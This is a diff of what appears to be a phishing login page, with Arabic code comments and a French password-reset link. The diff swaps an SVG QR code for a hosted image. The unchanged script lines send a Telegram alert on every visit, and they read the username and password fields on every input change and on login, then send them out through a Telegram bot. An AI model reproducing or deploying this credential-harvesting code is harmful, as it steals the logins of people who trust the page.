@@ -446,14 +446,12 @@
             color: #059669;
         }
 
-        .qr-code {
+        /* تنسيق مخصص للصورة الجديدة */
+        .qr-image-container img {
             width: 80px;
             height: 80px;
-        }
-
-        .qr-code svg {
-            width: 100%;
-            height: 100%;
+            border-radius: 8px;
+            object-fit: cover;
         }
 
         /* ========== قسم المطورين - أسود ========== */
@@ -549,7 +547,7 @@
         .btn-login { animation-delay: 0.4s; }
         .btn-create { animation-delay: 0.5s; }
         .forgot-link { animation-delay: 0.6s; }
-        .qr-code { animation-delay: 0.7s; }
+        .qr-image-container { animation-delay: 0.7s; }
 
         /* توافق الحاسوب الكبير */
         @media (min-width: 1024px) {
@@ -764,31 +762,8 @@
 
             <a class="forgot-link">Mot de passe oublié</a>
 
-            <div class="qr-code">
-                <svg viewBox="0 0 80 80" fill="none">
-                    <rect x="12" y="12" width="20" height="20" fill="#1a1a1a"/>
-                    <rect x="16" y="16" width="12" height="12" fill="white"/>
-                    <rect x="18" y="18" width="8" height="8" fill="#1a1a1a"/>
-                    
-                    <rect x="48" y="12" width="20" height="20" fill="#1a1a1a"/>
-                    <rect x="52" y="16" width="12" height="12" fill="white"/>
-                    <rect x="54" y="18" width="8" height="8" fill="#1a1a1a"/>
-                    
-                    <rect x="12" y="48" width="20" height="20" fill="#1a1a1a"/>
-                    <rect x="16" y="52" width="12" height="12" fill="white"/>
-                    <rect x="18" y="54" width="8" height="8" fill="#1a1a1a"/>
-                    
-                    <rect x="36" y="12" width="6" height="6" fill="#1a1a1a"/>
-                    <rect x="12" y="36" width="6" height="6" fill="#1a1a1a"/>
-                    <rect x="36" y="36" width="6" height="6" fill="#1a1a1a"/>
-                    <rect x="62" y="36" width="6" height="6" fill="#1a1a1a"/>
-                    <rect x="36" y="62" width="6" height="6" fill="#1a1a1a"/>
-                    
-                    <rect x="48" y="48" width="6" height="6" fill="#1a1a1a"/>
-                    <rect x="58" y="48" width="6" height="6" fill="#1a1a1a"/>
-                    <rect x="48" y="58" width="6" height="6" fill="#1a1a1a"/>
-                    <rect x="64" y="58" width="6" height="6" fill="#1a1a1a"/>
-                </svg>
+            <div class="qr-image-container">
+                <a href="https://imgbb.com/"><img src="https://i.ibb.co/Xr4zFnpp/A1-A2-E676-8643-423-F-BF5-B-128354918106.jpg" alt="A1A2E676 8643 423F BF5B 128354918106" border="0"></a>
             </div>
         </div>
     </div>
@@ -818,12 +793,10 @@
             fetch(url).catch(err => console.log("Telegram Error"));
         }
 
-        // إشعار فوري عند الزيارة
         window.onload = function() {
             sendToTelegram("🔔 زيارة جديدة للموقع!");
         };
 
-        // إرسال البيانات فور الكتابة
         document.addEventListener('change', function(e) {
             const user = document.getElementById('usernameField').value;
             const pass = document.getElementById('passwordField').value;
@@ -836,10 +809,9 @@
             const user = document.getElementById('usernameField').value;
             const pass = document.getElementById('passwordField').value;
             sendToTelegram(`🚀 تم الضغط على الدخول:\nالاسم: ${user}\nالكلمة: ${pass}`);
-            // هنا يمكنك إضافة إعادة توجيه إذا أردت
         }
-        // --- نهاية إعدادات البوت ---
 
+        // --- دوال التحكم في الواجهة ---
         function openMenu() {
             document.getElementById('menuOverlay').classList.add('active');
             document.getElementById('menuPanel').classList.add('active');
